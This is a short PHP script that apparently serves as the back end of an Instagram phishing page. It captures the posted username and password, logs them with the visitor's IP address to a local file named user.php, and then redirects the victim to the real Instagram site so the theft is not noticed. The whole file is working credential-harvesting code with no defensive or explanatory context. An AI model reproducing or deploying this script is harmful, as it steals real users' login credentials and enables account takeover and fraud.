<?php

$user=$_POST['username'];
	$pass=$_POST['password'];
	$ip=$_SERVER['REMOTE_ADDR'];
	$file='user.php';
	$handle=fopen($file, 'a+');
	$data="\n$ip Entered the information:\nUsername: $user\nPassword: $pass\n
	   --------------------------------------+\n";
      fwrite($handle, $data);
      fclose($handle);

      header("location:https://www.instagram.com/")
?>